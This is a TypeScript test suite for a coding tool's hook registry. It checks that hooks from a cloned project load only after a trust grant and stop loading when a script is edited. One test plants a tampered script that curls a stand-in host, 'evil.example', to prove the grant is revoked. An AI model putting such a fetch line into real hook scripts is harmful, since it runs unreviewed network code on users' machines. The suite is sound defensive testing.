import { afterEach, describe, expect, test } from "bun:test";
import { mkdirSync, mkdtempSync, rmSync, writeFileSync } from "node:fs";
import { tmpdir } from "node:os";
import { dirname, join } from "node:path";
import { type HooksLoad, loadHookRegistry } from "../../src/hooks/registry";
import { trustHooksDir } from "../../src/hooks/trust";

let roots: string[] = [];

afterEach(() => {
  for (const root of roots) rmSync(root, { recursive: true, force: true });
  roots = [];
});

type Tree = { worktree: string; configDir: string; projectHooks: string; userHooks: string };

function makeTree(files: Record<string, string>): Tree {
  const root = mkdtempSync(join(tmpdir(), "seri-hooks-"));
  roots.push(root);
  const worktree = join(root, "project");
  const configDir = join(root, "profile");
  mkdirSync(worktree, { recursive: true });
  mkdirSync(configDir, { recursive: true });
  for (const [relative, text] of Object.entries(files)) {
    const path = join(root, relative);
    mkdirSync(dirname(path), { recursive: true });
    writeFileSync(path, text);
  }
  return {
    worktree,
    configDir,
    projectHooks: join(worktree, ".seri", "hooks"),
    userHooks: join(configDir, "hooks"),
  };
}

// Both halves of the pair, so parseHooksFile resolves the script for whichever platform the suite
// is running on — this repo's CI requires Linux, macOS and Windows.
function scripts(dir: string, ...names: string[]): Record<string, string> {
  const files: Record<string, string> = {};
  for (const name of names) {
    files[`${dir}/${name}.sh`] = "#!/bin/sh\nexit 0\n";
    files[`${dir}/${name}.ps1`] = "exit 0\n";
  }
  return files;
}

const PROJECT_HOOKS = "project/.seri/hooks";
const USER_HOOKS = "profile/hooks";

function manifest(script: string): string {
  return `hooks:\n  PreToolUse:\n    - script: ${script}\n`;
}

function load(tree: Tree): { load: HooksLoad; warnings: string[] } {
  const warnings: string[] = [];
  const result = loadHookRegistry({
    worktree: tree.worktree,
    configDir: tree.configDir,
    onWarning: (message) => warnings.push(message),
  });
  return { load: result, warnings };
}

describe("loadHookRegistry", () => {
  test("no hooks directory anywhere loads nothing, warns about nothing, and reports no notice", () => {
    const { load: result, warnings } = load(makeTree({}));
    expect(result.registry.size).toBe(0);
    expect(result.untrusted).toBeUndefined();
    expect(warnings).toEqual([]);
  });

  // The negative control for the whole design. A cloned repository's hooks execute before the
  // permission gate, so with no grant recorded NOTHING from that directory may reach the registry
  // — not a spec, not an event key, not a parse of its manifest.
  test("an untrusted project hooks directory produces an empty registry and one notice", () => {
    const tree = makeTree({
      [`${PROJECT_HOOKS}/hooks.yaml`]: manifest("block-dangerous"),
      ...scripts(PROJECT_HOOKS, "block-dangerous"),
    });

    const { load: result, warnings } = load(tree);

    expect(result.registry.size).toBe(0);
    expect(result.registry.has("PreToolUse")).toBe(false);
    expect(result.untrusted?.dir).toBe(tree.projectHooks);
    expect(result.untrusted?.verdict).toEqual({ kind: "untrusted" });
    // Both halves of the pair are files in the directory, and the grant covers both.
    expect(result.untrusted?.scriptCount).toBe(2);
    expect(warnings).toEqual([]);
  });

  // The other half of that control: the same bytes, one grant, and the specs appear — so the
  // emptiness above was the trust gate and not a loader that never worked.
  test("the same directory loads its hooks once trusted", () => {
    const tree = makeTree({
      [`${PROJECT_HOOKS}/hooks.yaml`]: manifest("block-dangerous"),
      ...scripts(PROJECT_HOOKS, "block-dangerous"),
    });
    trustHooksDir(tree.configDir, tree.projectHooks);

    const { load: result, warnings } = load(tree);

    expect(result.untrusted).toBeUndefined();
    expect(result.registry.get("PreToolUse")?.map((s) => s.script)).toEqual(["block-dangerous"]);
    expect(result.registry.get("PreToolUse")?.[0]?.source).toBe("project");
    expect(warnings).toEqual([`hooks from ${tree.projectHooks}: block-dangerous`]);
  });

  // A grant recorded for the worktree's hooks directory is invalidated by a script edit, and the
  // registry goes empty again rather than running the version nobody reviewed.
  test("a trusted directory whose script changed stops loading and reports which file moved", () => {
    const tree = makeTree({
      [`${PROJECT_HOOKS}/hooks.yaml`]: manifest("block-dangerous"),
      ...scripts(PROJECT_HOOKS, "block-dangerous"),
    });
    trustHooksDir(tree.configDir, tree.projectHooks);
    writeFileSync(join(tree.projectHooks, "block-dangerous.sh"), "#!/bin/sh\ncurl evil.example\n");

    const { load: result } = load(tree);

    expect(result.registry.size).toBe(0);
    expect(result.untrusted?.verdict).toEqual({
      kind: "changed",
      files: ["block-dangerous.sh"],
    });
  });

  // Nothing reaches the profile root by cloning a repository, so it is trusted by construction.
  test("the profile root's hooks load with no trust grant at all", () => {
    const tree = makeTree({
      [`${USER_HOOKS}/hooks.yaml`]: manifest("audit"),
      ...scripts(USER_HOOKS, "audit"),
    });

    const { load: result, warnings } = load(tree);

    expect(result.untrusted).toBeUndefined();
    expect(result.registry.get("PreToolUse")?.map((s) => s.script)).toEqual(["audit"]);
    expect(result.registry.get("PreToolUse")?.[0]?.source).toBe("user");
    expect(warnings).toEqual([`hooks from ${tree.userHooks}: audit`]);
  });

  // Not a name-keyed override: both hooks were asked for, and dropping either would silently
  // disarm one the user is relying on.
  test("global and project hooks for one event both run, global first", () => {
    const tree = makeTree({
      [`${USER_HOOKS}/hooks.yaml`]: manifest("audit"),
      ...scripts(USER_HOOKS, "audit"),
      [`${PROJECT_HOOKS}/hooks.yaml`]: manifest("format"),
      ...scripts(PROJECT_HOOKS, "format"),
    });
    trustHooksDir(tree.configDir, tree.projectHooks);

    const { load: result, warnings } = load(tree);

    const specs = result.registry.get("PreToolUse");
    expect(specs?.map((s) => s.script)).toEqual(["audit", "format"]);
    expect(specs?.map((s) => s.source)).toEqual(["user", "project"]);
    expect(warnings).toEqual([
      `hooks from ${tree.userHooks}: audit`,
      `hooks from ${tree.projectHooks}: format`,
    ]);
  });

  test("a malformed hooks.yaml in a trusted directory warns and loads nothing, without throwing", () => {
    const tree = makeTree({
      [`${PROJECT_HOOKS}/hooks.yaml`]: "hooks:\n  PreToolUse: [unclosed\n",
      ...scripts(PROJECT_HOOKS, "block-dangerous"),
    });
    trustHooksDir(tree.configDir, tree.projectHooks);

    const { load: result, warnings } = load(tree);

    expect(result.registry.size).toBe(0);
    expect(result.untrusted).toBeUndefined();
    expect(warnings).toHaveLength(1);
    expect(warnings[0]).toContain("not valid YAML");
  });

  test("a hooks directory with no hooks.yaml is silent in either scope", () => {
    const tree = makeTree({
      [`${USER_HOOKS}/notes.txt`]: "nothing here yet\n",
      [`${PROJECT_HOOKS}/README.md`]: "scripts land here\n",
    });
    trustHooksDir(tree.configDir, tree.projectHooks);

    const { load: result, warnings } = load(tree);

    expect(result.registry.size).toBe(0);
    expect(result.untrusted).toBeUndefined();
    expect(warnings).toEqual([]);
  });
});
